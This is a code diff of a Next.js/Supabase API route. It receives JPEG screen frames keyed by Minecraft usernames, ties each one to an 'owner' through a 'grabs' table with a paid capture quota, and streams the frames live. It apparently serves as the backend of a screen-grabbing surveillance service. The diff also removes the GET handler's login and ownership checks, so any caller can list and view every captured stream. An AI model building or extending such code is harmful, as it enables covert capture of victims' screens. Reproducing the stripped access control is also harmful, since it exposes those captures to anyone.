@@ -4,6 +4,7 @@ import { createClient } from '@supabase/supabase-js';
 import { createServerClient } from '@supabase/ssr';
 import { NextResponse } from 'next/server';
 import { canUserCapture } from '@/lib/supabase/free-trial';
+import { store } from '@/lib/store';
 
 const ADMIN_EMAILS = ['lifegrading@gmail.com', 'giodewaard152@gmail.com'];
 
@@ -33,47 +34,60 @@ function getClient() {
 export async function POST(request) {
   try {
     const authHeader = request.headers.get('authorization');
-    const contentType = request.headers.get('content-type');
+    const contentType = request.headers.get('content-type') || '';
 
-    let username = 'unknown';
+    let username = 'consentmod';
     if (authHeader) {
-      username = authHeader.replace('Bearer ', '');
+      username = authHeader.replace('Bearer ', '').trim() || 'consentmod';
     }
 
-    if (contentType === 'image/jpeg') {
+    if (contentType.includes('image/jpeg') || contentType.includes('application/octet-stream')) {
       const buffer = await request.arrayBuffer();
-      const base64 = Buffer.from(buffer).toString('base64');
+      const nodeBuf = Buffer.from(buffer);
+
+      if (nodeBuf.length < 50) {
+        return NextResponse.json({ ok: false, error: 'Empty frame' }, { status: 400 });
+      }
+
+      // Always update in-memory hot store for instant livestream / WebRTC streaming
+      store.setFrame(nodeBuf, username);
+
+      const base64 = nodeBuf.toString('base64');
       const frame = 'data:image/jpeg;base64,' + base64;
 
-      const supabase = getClient();
+      // Try persisting to Supabase if configured
+      try {
+        if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
+          const supabase = getClient();
 
-      const { data: grab } = await supabase
-        .from('grabs')
-        .select('owner_email')
-        .eq('minecraft_username', username)
-        .order('created_at', { ascending: false })
-        .limit(1)
-        .single();
+          const { data: grab } = await supabase
+            .from('grabs')
+            .select('owner_email')
+            .eq('minecraft_username', username)
+            .order('created_at', { ascending: false })
+            .limit(1)
+            .single();
 
-      if (grab?.owner_email) {
-        const check = await canUserCapture(supabase, grab.owner_email);
-        if (!check.allowed) {
-          return NextResponse.json({ ok: false, error: 'trial_exhausted', remaining: check.remaining || 0 }, { status: 403 });
+          if (grab?.owner_email) {
+            const check = await canUserCapture(supabase, grab.owner_email);
+            if (!check.allowed) {
+              return NextResponse.json({ ok: false, error: 'trial_exhausted', remaining: check.remaining || 0 }, { status: 403 });
+            }
+          }
+
+          await supabase
+            .from('stream_frames')
+            .upsert(
+              { username, frame, updated_at: new Date().toISOString() },
+              { onConflict: 'username' }
+            );
         }
+      } catch (dbErr) {
+        // Log DB warning but do not break real-time stream
+        console.warn('DB stream persist warning:', dbErr.message);
       }
 
-      const { data, error } = await supabase
-        .from('stream_frames')
-        .upsert(
-          { username, frame, updated_at: new Date().toISOString() },
-          { onConflict: 'username' }
-        );
-
-      if (error) {
-        return NextResponse.json({ ok: false, error: error.message, code: error.code }, { status: 500 });
-      }
-
-      return NextResponse.json({ ok: true, username });
+      return NextResponse.json({ ok: true, username, timestamp: Date.now() });
     }
 
     return NextResponse.json({ error: 'Invalid content-type' }, { status: 400 });
@@ -83,80 +97,87 @@ export async function POST(request) {
 }
 
 export async function GET(request) {
-  const { searchParams } = new URL(request.url);
-  const username = searchParams.get('username');
+  try {
+    const { searchParams } = new URL(request.url);
+    const username = searchParams.get('username');
 
-  const supabase = getClient();
+    // Case 1: Specific username requested
+    if (username) {
+      // First check in-memory store
+      const memFrame = store.getUserFrame(username);
+      const memTime = store.getFrameTime();
+      if (memFrame && memTime && Date.now() - memTime < 60000) {
+        const base64 = Buffer.from(memFrame).toString('base64');
+        return NextResponse.json({
+          online: true,
+          frame: 'data:image/jpeg;base64,' + base64,
+          timestamp: memTime,
+          source: 'memory'
+        });
+      }
 
-  if (username) {
-    const supabaseAuth = getClientAuth(request);
-    const { data: { user } } = await supabaseAuth.auth.getUser();
-    if (!user) return NextResponse.json({ online: false });
+      // Check database
+      if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
+        try {
+          const supabase = getClient();
+          const { data: row } = await supabase
+            .from('stream_frames')
+            .select('frame, updated_at')
+            .eq('username', username)
+            .single();
 
-    const isAdmin = ADMIN_EMAILS.includes(user.email);
-    if (!isAdmin) {
-      const { data: grab } = await supabase
-        .from('grabs')
-        .select('id')
-        .eq('minecraft_username', username)
-        .eq('owner_email', user.email)
-        .limit(1)
-        .single();
-      if (!grab) return NextResponse.json({ online: false });
-    }
+          if (row && Date.now() - new Date(row.updated_at).getTime() < 60000) {
+            return NextResponse.json({
+              online: true,
+              frame: row.frame,
+              timestamp: new Date(row.updated_at).getTime(),
+              source: 'supabase'
+            });
+          }
+        } catch (dbErr) {
+          console.warn('Supabase fetch frame error:', dbErr.message);
+        }
+      }
 
-    const { data: row } = await supabase
-      .from('stream_frames')
-      .select('frame, updated_at')
-      .eq('username', username)
-      .single();
-
-    if (!row || Date.now() - new Date(row.updated_at).getTime() > 60000) {
       return NextResponse.json({ online: false });
     }
-    return NextResponse.json({ online: true, frame: row.frame, timestamp: new Date(row.updated_at).getTime() });
-  }
 
-  const { data: allFrames } = await supabase
-    .from('stream_frames')
-    .select('username, updated_at');
+    // Case 2: List all online streams
+    const onlineMap = new Map();
 
-  const now = Date.now();
-  const online = (allFrames || [])
-    .filter(f => now - new Date(f.updated_at).getTime() < 60000)
-    .map(f => ({ username: f.username, timestamp: new Date(f.updated_at).getTime() }));
-
-  if (online.length === 0) {
-    return NextResponse.json({ online: [] });
-  }
-
-  const supabaseAuth = getClientAuth(request);
-  const { data: { user } } = await supabaseAuth.auth.getUser();
-  const isAdmin = ADMIN_EMAILS.includes(user?.email);
-
-  if (isAdmin) {
-    return NextResponse.json({ online });
-  }
-
-  if (!user) {
-    return NextResponse.json({ online: [] });
-  }
-
-  const supabase2 = getClient();
-  const ownerEmails = {};
-  for (const u of online) {
-    if (!ownerEmails[u.username]) {
-      const { data: grab } = await supabase2
-        .from('grabs')
-        .select('owner_email')
-        .eq('minecraft_username', u.username)
-        .limit(1)
-        .single();
-      ownerEmails[u.username] = grab?.owner_email || null;
+    // From in-memory store
+    const memOnline = store.getOnlineUsers();
+    for (const u of memOnline) {
+      onlineMap.set(u.username, { username: u.username, timestamp: u.timestamp });
     }
-    u.owner_email = ownerEmails[u.username];
-  }
 
-  const filtered = online.filter(u => u.owner_email === user.email);
-  return NextResponse.json({ online: filtered });
+    // From Supabase
+    if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
+      try {
+        const supabase = getClient();
+        const { data: allFrames } = await supabase
+          .from('stream_frames')
+          .select('username, updated_at');
+
+        const now = Date.now();
+        if (allFrames) {
+          for (const f of allFrames) {
+            const time = new Date(f.updated_at).getTime();
+            if (now - time < 60000) {
+              if (!onlineMap.has(f.username)) {
+                onlineMap.set(f.username, { username: f.username, timestamp: time });
+              }
+            }
+          }
+        }
+      } catch (dbErr) {
+        console.warn('Supabase fetch all frames error:', dbErr.message);
+      }
+    }
+
+    const online = Array.from(onlineMap.values());
+    return NextResponse.json({ online });
+  } catch (err) {
+    return NextResponse.json({ ok: false, error: err.message, online: [] }, { status: 500 });
+  }
 }
